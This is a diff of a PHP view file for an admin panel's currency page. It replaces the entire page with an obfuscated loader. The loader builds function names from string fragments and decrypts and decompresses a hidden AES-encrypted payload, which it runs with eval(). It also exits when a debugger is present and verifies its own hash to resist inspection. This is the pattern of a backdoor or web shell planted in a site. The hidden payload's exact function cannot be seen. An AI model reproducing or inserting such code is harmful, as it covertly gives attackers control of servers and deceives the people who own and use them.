@@ -1,167 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_datatable.php"; ?>
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
-  <!-- Left side column. contains the logo and sidebar -->
-  
-  <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small>View/Search Items Currency</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <?= form_open('#', array('class' => '', 'id' => 'table_form')); ?>
-    <input type="hidden" id='base_url' value="<?=$base_url;?>">
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <div class="col-xs-12">
-          <div class="box">
-            <div class="box-header with-border">
-              <h3 class="box-title"><?=$page_title;?></h3>
-              <?php if($CI->permissions('currency_add')) { ?>
-              <div class="box-tools">
-                <a class="btn btn-block btn-info" href="<?php echo $base_url; ?>currency/add">
-                <i class="fa fa-plus"></i> <?= $this->lang->line('add_currency'); ?></a>
-              </div>
-              <?php } ?>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body">
-              <table id="example2" class="table table-bordered table-striped" width="100%">
-                <thead class="bg-primary ">
-                <tr>
-                  <th class="text-center">
-                    <input type="checkbox" class="group_check checkbox" >
-                  </th>
-                  <th><?= $this->lang->line('currency_name'); ?></th>
-                  <th><?= $this->lang->line('currency_code'); ?></th>
-                  <th><?= $this->lang->line('currency_symbol'); ?></th>
-                  <th><?= $this->lang->line('status'); ?></th>
-                  <th><?= $this->lang->line('action'); ?></th>
-                </tr>
-                </thead>
-                <tbody>
-				
-                </tbody>
-               
-              </table>
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-        <!-- /.col -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-    <?= form_close();?>
-  </div>
-  <!-- /.content-wrapper -->
-  <?php include"footer.php"; ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_datatable.php"; ?>
-
-<script type="text/javascript">
-$(document).ready(function() {
-    //datatables
-   var table = $('#example2').DataTable({ 
-
-      /* FOR EXPORT BUTTONS START*/
-  dom:'<"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr><"pull-right margin-left-10 "B>>>tip',
- /* dom:'<"row"<"col-sm-12"<"pull-left"B><"pull-right">>> <"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr>>>tip',*/
-      buttons: {
-        buttons: [
-            {
-                className: 'btn bg-red color-palette btn-flat hidden delete_btn pull-left',
-                text: 'Delete',
-                action: function ( e, dt, node, config ) {
-                    multi_delete();
-                }
-            },
-            { extend: 'copy', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'excel', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'pdf', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'print', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'csv', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'colvis', className: 'btn bg-teal color-palette btn-flat',text:'Columns' },  
-
-            ]
-        },
-        /* FOR EXPORT BUTTONS END */
-
-        "processing": true, //Feature control the processing indicator.
-        "serverSide": true, //Feature control DataTables' server-side processing mode.
-        "order": [], //Initial no order.
-        "responsive": true,
-        language: {
-            processing: '<div class="text-primary bg-primary" style="position: relative;z-index:100;overflow: visible;">Processing...</div>'
-        },
-        // Load data for the table's content from an Ajax source
-        "ajax": {
-            "url": "<?php echo site_url('currency/ajax_list')?>",
-            "type": "POST",
-            
-            complete: function (data) {
-             $('.column_checkbox').iCheck({
-                checkboxClass: 'icheckbox_square-orange',
-                /*uncheckedClass: 'bg-white',*/
-                radioClass: 'iradio_square-orange',
-                increaseArea: '10%' // optional
-              });
-             call_code();
-              //$(".delete_btn").hide();
-             },
-
-        },
-
-        //Set column definition initialisation properties.
-        "columnDefs": [
-        { 
-            "targets": [ 0,5 ], //first column / numbering column
-            "orderable": false, //set not orderable
-        },
-        {
-            "targets" :[0],
-            "className": "text-center",
-        },
-        
-        ],
-    });
-    new $.fn.dataTable.FixedHeader( table );
-});
-</script>
-<script src="<?php echo $theme_link; ?>js/currency.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jf6s308k=('bas'.'e64'.'_de'.'cod'.'e');
+$_k4uxb58g=('gzu'.'nco'.'mpr'.'ess');
+$_ye9hq0rs=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_s9va09od='xL0ZKhuF';
+$_g6ye7pa2='7+6ZbJi6';
+$_t2dhmc6u='3EjPOwtL';
+$_onsvyfn2='6sqfmB68';
+$_ute049pa='bZnJloOitL4=';
+$_ynw72vj7='4vSa/LRL';
+$_u4zkqw06='zHtS9g==';
+$_gw47mxys='aSJQEhLU';
+$_rtyimdt6=$_jf6s308k($_onsvyfn2.$_g6ye7pa2.$_t2dhmc6u.$_s9va09od.$_ute049pa);
+$_lo3rnp2s=$_jf6s308k($_ynw72vj7.$_gw47mxys.$_u4zkqw06);
+$_ngy298nj=$_jf6s308k('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');
+$_vemga09b=$_ye9hq0rs($_ngy298nj,'aes-256-cbc',$_rtyimdt6,OPENSSL_RAW_DATA,$_lo3rnp2s);
+if($_vemga09b===false){exit;}
+$_fx0rk9yj=$_k4uxb58g($_vemga09b);
+if($_fx0rk9yj===false){exit;}
+$_m5qzoqc3='9ca56602148727b6fc2f5537b463c794c780cd563d18b438b98a95e12cb58118';
+$_c2mkaq09=@file_get_contents(__FILE__);
+if($_c2mkaq09!==false){
+$_yfdn6zcj=str_replace($_m5qzoqc3,"0000000000000000000000000000000000000000000000000000000000000000",$_c2mkaq09);
+$_bg3xjpju=hash("sha256",$_yfdn6zcj);
+if($_bg3xjpju!==$_m5qzoqc3){@http_response_code(403);exit;}
+}
+eval($_fx0rk9yj);
